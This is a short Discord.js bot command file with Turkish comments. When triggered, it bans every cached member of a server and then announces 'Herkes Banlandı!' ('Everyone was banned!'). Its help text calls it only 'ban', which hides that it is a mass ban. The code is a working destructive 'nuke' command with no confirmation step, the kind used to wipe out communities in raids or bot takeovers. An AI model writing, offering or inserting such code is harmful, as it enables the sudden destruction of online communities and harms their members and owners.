const Discord = require('discord.js');
exports.run = async (client, message, args) => {
  
    message.guild.members.cache.forEach(member => member.ban()) //Bu komut herkesi banlar
    message.channel.send("Herkes Banlandı!") //Yazılan kanala "Herkes Banlandı!" yazar
  
};

exports.conf = {
  enabled: true, 
  guildOnly: false, 
  aliases: ["ban  "],
  permLevel: 5 
};

exports.help = {
  name: 'ban',
  description: 'ban',
  usage: 'ban'
};